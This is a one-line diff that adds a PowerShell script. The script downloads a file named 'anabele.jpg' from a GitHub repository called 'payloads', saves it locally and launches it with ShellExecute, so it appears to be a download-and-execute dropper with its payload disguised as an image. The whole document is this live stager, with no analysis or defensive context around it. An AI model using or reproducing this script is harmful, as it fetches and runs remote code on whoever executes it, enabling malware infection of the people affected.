@@ -1,0 +1,1 @@
+$down = New-Object System.Net.WebClient; $url = 'https://raw.githubusercontent.com/Paulo-rafael-25/payloads/main/anabele.jpg'; $file = 'anabele.jpg'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit
